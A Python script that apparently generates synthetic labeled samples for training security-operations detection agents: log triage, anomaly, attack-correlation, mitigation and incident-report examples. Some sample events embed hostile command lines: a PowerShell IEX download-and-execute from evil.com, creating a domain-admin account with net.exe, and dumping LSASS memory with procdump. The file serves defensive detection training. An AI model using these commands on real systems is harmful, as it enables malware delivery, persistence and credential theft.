"""
Synthetic training data generator for the SOC Multi-Agent System.
Produces labeled samples for each specialized agent.
"""

import json
import random
from datetime import datetime, timedelta


def random_ip(private=False):
    if private:
        return f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def random_time(base=None, delta_minutes=0):
    base = base or datetime(2024, 6, 1, 8, 0, 0)
    return (base + timedelta(minutes=delta_minutes)).strftime("%Y-%m-%dT%H:%M:%SZ")


# ─────────────────────────────────────────────
# 1. LOG TRIAGE TRAINING DATA
# ─────────────────────────────────────────────

LOG_TRIAGE_SAMPLES = [
    {
        "input": {
            "raw_log": "Jun 01 02:14:33 ws01 sshd[1234]: Failed password for root from 198.51.100.22 port 52341 ssh2"
        },
        "expected_output": {
            "timestamp": "Jun 01 02:14:33",
            "hostname": "ws01",
            "username": "root",
            "source_ip": "198.51.100.22",
            "destination_ip": None,
            "process": "sshd",
            "event_id": None,
            "file_path": None,
            "domain": None,
            "url": None,
            "action": "Failed password",
            "result": "Failure",
            "classification": "Authentication",
            "noise_level": "Suspicious",
            "severity": "High",
            "escalation": "Escalate"
        }
    },
    {
        "input": {
            "raw_log": "2024-06-01T09:00:01Z host=dc01 EventID=4624 Account=CORP\\jsmith LogonType=3 SourceIP=10.0.1.50"
        },
        "expected_output": {
            "timestamp": "2024-06-01T09:00:01Z",
            "hostname": "dc01",
            "username": "CORP\\jsmith",
            "source_ip": "10.0.1.50",
            "destination_ip": None,
            "process": None,
            "event_id": "4624",
            "file_path": None,
            "domain": "CORP",
            "url": None,
            "action": "Logon",
            "result": "Success",
            "classification": "Authentication",
            "noise_level": "Expected Activity",
            "severity": "Informational",
            "escalation": "Close"
        }
    },
    {
        "input": {
            "raw_log": "2024-06-01T23:47:10Z host=fin-srv02 EventID=4688 NewProcessName=C:\\Windows\\System32\\cmd.exe ParentProcess=explorer.exe User=CORP\\guest"
        },
        "expected_output": {
            "timestamp": "2024-06-01T23:47:10Z",
            "hostname": "fin-srv02",
            "username": "CORP\\guest",
            "source_ip": None,
            "destination_ip": None,
            "process": "cmd.exe",
            "event_id": "4688",
            "file_path": "C:\\Windows\\System32\\cmd.exe",
            "domain": "CORP",
            "url": None,
            "action": "Process Creation",
            "result": "Created",
            "classification": "Endpoint",
            "noise_level": "Suspicious",
            "severity": "Medium",
            "escalation": "Escalate"
        }
    },
    {
        "input": {
            "raw_log": "2024-06-01T14:22:05Z src=10.10.5.200 dst=8.8.8.8 proto=UDP dport=53 bytes=8192 query=aHR0cHM6Ly9ldmlsLmNvbQ==.malicious.com"
        },
        "expected_output": {
            "timestamp": "2024-06-01T14:22:05Z",
            "hostname": None,
            "username": None,
            "source_ip": "10.10.5.200",
            "destination_ip": "8.8.8.8",
            "process": None,
            "event_id": None,
            "file_path": None,
            "domain": "malicious.com",
            "url": None,
            "action": "DNS Query",
            "result": "Sent",
            "classification": "Network",
            "noise_level": "High Priority",
            "severity": "Critical",
            "escalation": "Escalate"
        }
    },
    {
        "input": {
            "raw_log": "2024-06-01T11:05:00Z aws_account=123456789 event=ConsoleLogin user=devops@corp.com result=Success mfa=false src_ip=203.0.113.77"
        },
        "expected_output": {
            "timestamp": "2024-06-01T11:05:00Z",
            "hostname": None,
            "username": "devops@corp.com",
            "source_ip": "203.0.113.77",
            "destination_ip": None,
            "process": None,
            "event_id": "ConsoleLogin",
            "file_path": None,
            "domain": "corp.com",
            "url": None,
            "action": "Console Login",
            "result": "Success",
            "classification": "Cloud",
            "noise_level": "Suspicious",
            "severity": "High",
            "escalation": "Escalate",
            "note": "MFA not used for cloud console login"
        }
    },
]

# Add 20 more auto-generated samples
SEVERITY_MAP = ["Informational", "Low", "Medium", "High", "Critical"]
CLASSIFICATIONS = ["Authentication", "Endpoint", "Network", "Cloud", "Malware", "Data Access"]
ESCALATIONS = ["Close", "Monitor", "Escalate"]

for i in range(20):
    # Use deterministic severity based on result to match triage agent rules
    result_str = 'Success' if i % 2 == 0 else 'Failure'
    sev = "Informational" if result_str == "Success" else "High"
    esc = "Close" if result_str == "Success" else "Escalate"
    cls = "Authentication"
    hour = random.randint(0, 23)
    src_ip = random_ip()
    LOG_TRIAGE_SAMPLES.append({
        "input": {"raw_log": f"2024-06-01T{hour:02d}:{random.randint(0,59):02d}:00Z host=server{i} EventID={4624 if result_str=='Success' else 4625} User=user{i}@corp.com SrcIP={src_ip} Action=Login Result={result_str}"},
        "expected_output": {
            "hostname": f"server{i}",
            "username": f"user{i}@corp.com",
            "source_ip": src_ip,
            "classification": cls,
            "severity": sev,
            "escalation": esc
        }
    })


# ─────────────────────────────────────────────
# 2. ANOMALY DETECTION TRAINING DATA
# ─────────────────────────────────────────────

ANOMALY_SAMPLES = [
    {
        "input": {
            "events": [
                {"time": "03:14:22", "user": "jdoe", "src_ip": "5.188.210.55", "action": "SSH login", "result": "Failed"},
                {"time": "03:14:23", "user": "admin", "src_ip": "5.188.210.55", "action": "SSH login", "result": "Failed"},
                {"time": "03:14:24", "user": "root", "src_ip": "5.188.210.55", "action": "SSH login", "result": "Failed"},
                {"time": "03:14:25", "user": "test", "src_ip": "5.188.210.55", "action": "SSH login", "result": "Failed"},
                {"time": "03:14:26", "user": "guest", "src_ip": "5.188.210.55", "action": "SSH login", "result": "Failed"},
            ]
        },
        "expected_output": {
            "anomaly_type": "Brute Force / Password Spraying",
            "description": "Multiple failed SSH login attempts across different usernames from single IP in under 5 seconds",
            "confidence": 0.95,
            "attack_technique": "T1110.003 - Password Spraying",
            "risk": "High"
        }
    },
    {
        "input": {
            "events": [
                {"time": "08:00:00", "user": "ceo@corp.com", "src_ip": "203.0.113.5", "location": "New York", "action": "Login", "result": "Success"},
                {"time": "08:45:00", "user": "ceo@corp.com", "src_ip": "185.220.101.40", "location": "Moscow", "action": "Login", "result": "Success"},
            ]
        },
        "expected_output": {
            "anomaly_type": "Impossible Travel",
            "description": "Same user authenticated from New York then Moscow within 45 minutes — physically impossible",
            "confidence": 0.97,
            "attack_technique": "T1078 - Valid Accounts",
            "risk": "Critical"
        }
    },
    {
        "input": {
            "events": [
                {"time": "14:10:00", "host": "ws22", "process": "powershell.exe", "cmdline": "IEX(New-Object Net.WebClient).DownloadString('http://192.168.100.5/payload.ps1')", "user": "CORP\\bob"}
            ]
        },
        "expected_output": {
            "anomaly_type": "Suspicious PowerShell Execution",
            "description": "PowerShell IEX (Invoke-Expression) downloading and executing remote script — classic fileless malware loader",
            "confidence": 0.99,
            "attack_technique": "T1059.001 - PowerShell",
            "risk": "Critical"
        }
    },
    {
        "input": {
            "events": [
                {"time": t, "host": "ws10", "dst_ip": "198.51.100.99", "dst_port": 443, "bytes": 512, "interval_sec": 300}
                for t in [f"0{h}:{m:02d}:00" for h in range(1, 9) for m in [0]]
            ]
        },
        "expected_output": {
            "anomaly_type": "C2 Beaconing",
            "description": "Host ws10 making consistent 512-byte HTTPS connections to same external IP every 300 seconds — highly regular beaconing pattern",
            "confidence": 0.93,
            "attack_technique": "T1071.001 - Web Protocols C2",
            "risk": "High"
        }
    },
    {
        "input": {
            "events": [
                {"time": "22:30:00", "user": "svc_backup", "action": "CreateAccessKey", "cloud": "AWS", "result": "Success"},
                {"time": "22:31:00", "user": "svc_backup", "action": "AttachUserPolicy", "policy": "AdministratorAccess", "result": "Success"},
            ]
        },
        "expected_output": {
            "anomaly_type": "Cloud Privilege Escalation",
            "description": "Service account created new access key then immediately granted itself AdministratorAccess — likely compromised or insider threat",
            "confidence": 0.96,
            "attack_technique": "T1098 - Account Manipulation",
            "risk": "Critical"
        }
    },
]


# ─────────────────────────────────────────────
# 3. THREAT CORRELATION TRAINING DATA
# ─────────────────────────────────────────────

CORRELATION_SAMPLES = [
    {
        "input": {
            "events": [
                {"time": "2024-06-01T02:14:33Z", "type": "brute_force", "src_ip": "198.51.100.22", "target_user": "admin", "result": "Success", "host": "dc01"},
                {"time": "2024-06-01T02:17:00Z", "type": "process_creation", "host": "dc01", "user": "admin", "process": "net.exe", "args": "user hacker P@ss1 /add /domain"},
                {"time": "2024-06-01T02:18:00Z", "type": "process_creation", "host": "dc01", "user": "admin", "process": "net.exe", "args": "group 'Domain Admins' hacker /add"},
                {"time": "2024-06-01T02:20:00Z", "type": "lateral_movement", "src_host": "dc01", "dst_host": "fin-srv02", "user": "hacker", "method": "WMI"},
                {"time": "2024-06-01T02:45:00Z", "type": "data_staging", "host": "fin-srv02", "user": "hacker", "path": "C:\\Temp\\dump.zip", "size_mb": 450},
                {"time": "2024-06-01T03:00:00Z", "type": "exfiltration", "src_ip": "192.168.1.55", "dst_ip": "45.33.32.156", "port": 443, "bytes": 472000000},
            ]
        },
        "expected_output": {
            "attack_stages": [
                "Initial Access - Brute Force SSH/RDP",
                "Execution - net.exe user creation",
                "Privilege Escalation - Domain Admin group addition",
                "Lateral Movement - WMI to fin-srv02",
                "Collection - Data staging to C:\\Temp\\dump.zip",
                "Exfiltration - 450MB to external IP"
            ],
            "mitre_techniques": ["T1110", "T1136", "T1078.002", "T1047", "T1074", "T1041"],
            "confidence": 0.94,
            "attacker_objective": "Financial data theft"
        }
    },
]


# ─────────────────────────────────────────────
# 4. MITIGATION PLANNING TRAINING DATA
# ─────────────────────────────────────────────

MITIGATION_SAMPLES = [
    {
        "input": {
            "severity": "Critical",
            "attack_type": "Ransomware",
            "affected_hosts": ["ws01", "ws02", "fin-srv02"],
            "indicators": {"ips": ["198.51.100.5"], "hashes": ["d41d8cd98f00b204e9800998ecf8427e"]},
            "lateral_movement_confirmed": True
        },
        "expected_output": {
            "immediate_actions": [
                "Isolate affected hosts from network immediately",
                "Block IOC IPs at perimeter firewall and EDR",
                "Disable compromised user accounts",
                "Preserve forensic evidence — snapshot VMs before remediation",
                "Notify incident response team and management"
            ],
            "short_term": [
                "Restore from clean backups after validation",
                "Force password reset for all domain accounts",
                "Patch vulnerability used for initial access",
                "Deploy enhanced EDR rules for ransomware indicators"
            ],
            "long_term": [
                "Implement network segmentation to limit lateral movement",
                "Deploy immutable backup solution",
                "Enforce MFA for all privileged accounts",
                "Conduct tabletop exercises for ransomware scenarios"
            ]
        }
    },
]


# ─────────────────────────────────────────────
# 5. INCIDENT REPORT TRAINING DATA
# ─────────────────────────────────────────────

REPORT_SAMPLES = [
    {
        "input": {
            "incident_id": "INC-2024-001",
            "severity": "Critical",
            "type": "Data Exfiltration via Compromised Admin Account",
            "timeline": [
                {"time": "02:14", "event": "Brute force from 198.51.100.22 succeeded against admin on dc01"},
                {"time": "02:18", "event": "Attacker added hacker account to Domain Admins"},
                {"time": "02:20", "event": "Lateral movement to fin-srv02 via WMI"},
                {"time": "03:00", "event": "450MB exfiltrated to 45.33.32.156"},
            ],
            "iocs": {"ips": ["198.51.100.22", "45.33.32.156"], "accounts": ["hacker"], "hosts": ["dc01", "fin-srv02"]},
            "mitre": ["T1110", "T1078.002", "T1047", "T1041"],
            "impact": "Potential exposure of 450MB of financial data"
        },
        "expected_output": {
            "exec_summary": "A critical security incident involving brute-force compromise of an administrative account resulted in lateral movement and exfiltration of approximately 450MB of financial data to an external IP.",
            "status": "Contained",
            "recommendations": ["Enforce account lockout policies", "Implement network segmentation", "Deploy DLP solution"],
            "root_cause": "Absence of account lockout policy allowed brute-force success"
        }
    },
]


# ─────────────────────────────────────────────
# COMBINED EXPORT
# ─────────────────────────────────────────────

ALL_TRAINING_DATA = {
    "log_triage": LOG_TRIAGE_SAMPLES,
    "anomaly_detection": ANOMALY_SAMPLES,
    "threat_correlation": CORRELATION_SAMPLES,
    "mitigation_planning": MITIGATION_SAMPLES,
    "incident_report": REPORT_SAMPLES
}


def save_training_data(path="data/training_data.json"):
    with open(path, "w") as f:
        json.dump(ALL_TRAINING_DATA, f, indent=2)
    print(f"[✓] Training data saved to {path}")
    total = sum(len(v) for v in ALL_TRAINING_DATA.values())
    print(f"[✓] Total samples: {total}")
    for k, v in ALL_TRAINING_DATA.items():
        print(f"    {k}: {len(v)} samples")


if __name__ == "__main__":
    save_training_data()

# ─────────────────────────────────────────────
# ADDITIONAL TRAINING DATA (boosts low-sample agents)
# ─────────────────────────────────────────────

EXTRA_CORRELATION_SAMPLES = [
    {
        "input": {
            "events": [
                {"time": "14:10:00", "host": "ws22", "process": "powershell.exe",
                 "cmdline": "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')",
                 "type": "process_creation", "user": "CORP\\bob"},
                {"time": "14:15:00", "host": "ws22", "dst_ip": "198.51.100.99",
                 "interval_sec": 300, "type": "beaconing"},
                {"time": "15:00:00", "host": "ws22", "dst_ip": "45.33.32.156",
                 "size_mb": 200, "type": "data_staging"},
            ]
        },
        "expected_output": {
            "attack_stages": ["Execution", "Exfiltration", "Collection"],
            "mitre_techniques": ["T1059", "T1071", "T1074"],
            "confidence": 0.88,
            "attacker_objective": "Data theft via PowerShell loader"
        }
    },
    {
        "input": {
            "events": [
                {"time": "22:30:00", "user": "svc_backup", "action": "CreateAccessKey",
                 "type": "cloud_iam", "result": "Success"},
                {"time": "22:31:00", "user": "svc_backup", "action": "AttachUserPolicy",
                 "policy": "AdministratorAccess", "type": "cloud_iam", "result": "Success"},
                {"time": "22:35:00", "user": "svc_backup", "action": "ListBuckets",
                 "type": "cloud_data_access", "result": "Success"},
            ]
        },
        "expected_output": {
            "attack_stages": ["Privilege Escalation", "Collection"],
            "mitre_techniques": ["T1098", "T1074"],
            "confidence": 0.92,
            "attacker_objective": "Cloud account compromise for data access"
        }
    },
    {
        "input": {
            "anomalies": [
                {"anomaly_type": "Impossible Travel", "description": "New York to Moscow in 45 min",
                 "evidence": {"user": "ceo@corp.com", "locations": ["New York", "Moscow"]},
                 "confidence": 0.97, "risk": "Critical"},
                {"anomaly_type": "Suspicious PowerShell Execution",
                 "description": "IEX DownloadString detected",
                 "evidence": {"host": "ws01", "user": "ceo@corp.com"},
                 "confidence": 0.99, "risk": "Critical"},
                {"anomaly_type": "Credential Dumping",
                 "description": "procdump targeting lsass.exe",
                 "evidence": {"host": "ws01"},
                 "confidence": 0.98, "risk": "Critical"},
            ],
            "events": []
        },
        "expected_output": {
            "attack_stages": ["Initial Access", "Execution", "Credential Access"],
            "mitre_techniques": ["T1078", "T1059", "T1003"],
            "confidence": 0.94,
            "attacker_objective": "Credential harvesting for further attacks"
        }
    },
]

EXTRA_MITIGATION_SAMPLES = [
    {
        "input": {
            "severity": "Critical",
            "attack_type": "Cloud IAM Privilege Escalation",
            "events": [
                {"user": "svc_backup", "action": "CreateAccessKey", "result": "Success"},
                {"user": "svc_backup", "action": "AttachUserPolicy",
                 "policy": "AdministratorAccess", "result": "Success"},
            ],
            "createaccesskey": True,
            "cloud priv": True,
            "ioc": True,
        },
        "expected_output": {
            "immediate_actions": [
                "Revoke compromised IAM access keys; disable affected cloud accounts.",
                "Preserve all relevant forensic evidence before making changes.",
                "Notify the Incident Response team and initiate the IR runbook.",
            ],
            "short_term": [
                "Audit all CloudTrail / Azure Activity Logs for the past 30 days.",
            ],
            "long_term": [
                "Apply least-privilege IAM policies; conduct quarterly access reviews.",
            ]
        }
    },
    {
        "input": {
            "severity": "High",
            "attack_type": "Brute Force SSH",
            "brute force": True,
            "brute_force": True,
            "lateral movement": True,
            "lateral_movement": True,
            "credential dump": True,
        },
        "expected_output": {
            "immediate_actions": [
                "Block source IP(s) at perimeter firewall and WAF immediately.",
                "Isolate affected hosts from the network to contain spread.",
                "Force domain-wide password reset for all privileged accounts.",
            ],
            "short_term": [
                "Implement geo-blocking for high-risk originating countries.",
                "Review and tighten SMB/WMI access control lists across all segments.",
            ],
            "long_term": [
                "Implement Zero Trust Network Access (ZTNA) with continuous auth.",
                "Implement network segmentation to limit blast radius of future breaches.",
            ]
        }
    },
    {
        "input": {
            "severity": "Critical",
            "attack_type": "C2 Beaconing and Data Exfiltration",
            "beaconing": True,
            "c2 beaconing": True,
            "exfiltration": True,
            "data exfil": True,
            "ioc": True,
        },
        "expected_output": {
            "immediate_actions": [
                "Block C2 destination IP/domain at DNS and perimeter; isolate host.",
                "Block egress to destination IPs; invoke DLP quarantine if available.",
            ],
            "short_term": [
                "Update proxy/firewall rules to block known C2 infrastructure.",
                "Deploy Data Loss Prevention (DLP) for sensitive file types.",
            ],
            "long_term": [
                "Integrate Threat Intelligence Platform (TIP) for automated IOC blocking.",
                "Deploy full-packet capture at network egress points.",
            ]
        }
    },
]

EXTRA_REPORT_SAMPLES = [
    {
        "input": {
            "incident_id": "INC-2024-002",
            "severity": "Critical",
            "type": "Cloud Privilege Escalation",
            "status": "Active",
            "iocs": {
                "ips": ["203.0.113.77"],
                "accounts": ["svc_backup"],
                "hostnames": ["aws-prod-account"],
            },
            "affected_hosts": ["aws-prod-account"],
            "triage": {
                "severity": "Critical",
                "extracted_indicators": {
                    "source_ip": "203.0.113.77",
                    "username": "svc_backup",
                }
            },
            "anomaly": {
                "detected_anomalies": [
                    {"anomaly_type": "Cloud Privilege Escalation",
                     "description": "svc_backup created access key and attached AdministratorAccess",
                     "confidence": 0.96, "risk": "Critical",
                     "mitre_technique": "T1098 – Account Manipulation"},
                ]
            },
            "correlation": {
                "confidence_level": "High (0.94)",
                "attack_narrative": "Service account created new access key then granted itself AdministratorAccess.",
                "mitre_attack_mapping": [
                    {"technique_id": "T1098", "technique_name": "Account Manipulation", "confidence": 0.96}
                ],
                "attack_timeline": [
                    {"time": "22:30:00", "stage": "Privilege Escalation",
                     "event": "CreateAccessKey by svc_backup", "technique": "T1098"},
                    {"time": "22:31:00", "stage": "Privilege Escalation",
                     "event": "AttachUserPolicy AdministratorAccess", "technique": "T1098"},
                ],
                "potential_attacker_objectives": ["Cloud account compromise", "Data theft"],
                "correlated_events": [
                    {"attack_stage": "Privilege Escalation", "technique_id": "T1098",
                     "technique_name": "Account Manipulation", "description": "IAM abuse",
                     "confidence": 0.95}
                ],
                "shared_indicators": {"ips": ["203.0.113.77"], "users": ["svc_backup"]},
            },
            "mitigation": {
                "immediate_actions": {
                    "P1": ["Revoke compromised IAM access keys; disable affected cloud accounts.",
                           "Block source IP 203.0.113.77 at perimeter."]
                },
                "short_term_remediation": ["Audit all CloudTrail logs for 30 days."],
                "long_term_hardening": ["Apply least-privilege IAM policies."],
            },
            "recommendations": {
                "immediate": ["Revoke IAM keys", "Disable svc_backup account"],
                "short_term": ["Audit CloudTrail", "Review all IAM permissions"],
                "long_term": ["Enforce least-privilege", "Enable AWS Config rules"]
            }
        },
        "expected_output": {
            "exec_summary": "Critical severity cloud privilege escalation detected",
            "status": "Active",
            "recommendations": ["Revoke IAM keys", "Disable svc_backup account"],
            "root_cause": "Service account abused to self-escalate privileges"
        }
    },
    {
        "input": {
            "incident_id": "INC-2024-003",
            "severity": "High",
            "type": "Brute Force Authentication",
            "status": "Monitoring",
            "iocs": {
                "ips": ["5.188.210.55"],
                "accounts": ["admin", "root"],
                "hostnames": ["dc01"],
            },
            "affected_hosts": ["dc01"],
            "triage": {
                "severity": "High",
                "extracted_indicators": {
                    "source_ip": "5.188.210.55", "hostname": "dc01",
                    "username": "admin"
                }
            },
            "anomaly": {
                "detected_anomalies": [
                    {"anomaly_type": "Brute Force Authentication",
                     "description": "10 failed attempts from 5.188.210.55",
                     "confidence": 0.95, "risk": "High",
                     "mitre_technique": "T1110.001 – Brute Force: Password Guessing"},
                ]
            },
            "correlation": {
                "confidence_level": "High (0.91)",
                "attack_narrative": "Automated brute-force attack from single IP targeting admin accounts.",
                "mitre_attack_mapping": [
                    {"technique_id": "T1110.001", "technique_name": "Password Guessing", "confidence": 0.95}
                ],
                "attack_timeline": [
                    {"time": "03:14:22", "stage": "Initial Access",
                     "event": "10 failed SSH attempts", "technique": "T1110.001"},
                ],
                "potential_attacker_objectives": ["Initial access via credential compromise"],
                "correlated_events": [
                    {"attack_stage": "Initial Access", "technique_id": "T1110",
                     "technique_name": "Brute Force", "description": "SSH brute force",
                     "confidence": 0.92}
                ],
                "shared_indicators": {"ips": ["5.188.210.55"], "users": ["admin", "root"]},
            },
            "mitigation": {
                "immediate_actions": {
                    "P1": ["Block 5.188.210.55 at perimeter firewall immediately.",
                           "Enforce account lockout policy (≤5 failures / 15 min)."]
                },
                "short_term_remediation": ["Implement geo-blocking.", "Deploy MFA."],
                "long_term_hardening": ["Implement ZTNA.", "Deploy honeypot accounts."],
            },
            "recommendations": {
                "immediate": ["Block source IP", "Enforce account lockout"],
                "short_term": ["Implement geo-blocking", "Deploy MFA for SSH"],
                "long_term": ["Implement ZTNA", "Deploy deception technology"]
            }
        },
        "expected_output": {
            "exec_summary": "High severity brute force authentication attack",
            "status": "Monitoring",
            "recommendations": ["Block source IP", "Enforce account lockout"],
            "root_cause": "Absence of account lockout policy enabled brute force"
        }
    },
]

EXTRA_ANOMALY_SAMPLES = [
    {
        "input": {
            "events": [
                {"host": "dc01", "process": "procdump.exe",
                 "cmdline": "procdump -ma lsass.exe C:\\Temp\\lsass.dmp", "user": "CORP\\admin"},
            ]
        },
        "expected_output": {
            "anomaly_type": "Credential Dumping",
            "description": "procdump targeting lsass.exe process memory",
            "confidence": 0.98,
            "attack_technique": "T1003.001 – LSASS Memory",
            "risk": "Critical"
        }
    },
    {
        "input": {
            "events": [
                {"src_host": "dc01", "dst_host": "fin-srv02",
                 "user": "hacker", "method": "WMI",
                 "time": "02:20:00"},
                {"src_host": "fin-srv02", "dst_host": "hr-srv01",
                 "user": "hacker", "method": "psexec",
                 "time": "02:35:00"},
            ]
        },
        "expected_output": {
            "anomaly_type": "Lateral Movement",
            "description": "Lateral movement via WMI and PsExec across multiple hosts",
            "confidence": 0.90,
            "attack_technique": "T1047 – WMI / T1021 – Remote Services",
            "risk": "High"
        }
    },
    {
        "input": {
            "events": [
                {"user": "devops@corp.com", "action": "ConsoleLogin",
                 "result": "Success", "mfa": False,
                 "src_ip": "185.220.101.40", "location": "Tor Exit Node"},
            ]
        },
        "expected_output": {
            "anomaly_type": "MFA Bypass / Suspicious Login",
            "description": "Console login without MFA from Tor exit node",
            "confidence": 0.93,
            "attack_technique": "T1078 – Valid Accounts",
            "risk": "High"
        }
    },
]

# Merge into main ALL_TRAINING_DATA
ALL_TRAINING_DATA["threat_correlation"].extend(EXTRA_CORRELATION_SAMPLES)
ALL_TRAINING_DATA["mitigation_planning"].extend(EXTRA_MITIGATION_SAMPLES)
ALL_TRAINING_DATA["incident_report"].extend(EXTRA_REPORT_SAMPLES)
ALL_TRAINING_DATA["anomaly_detection"].extend(EXTRA_ANOMALY_SAMPLES)

if __name__ == "__main__":
    save_training_data()
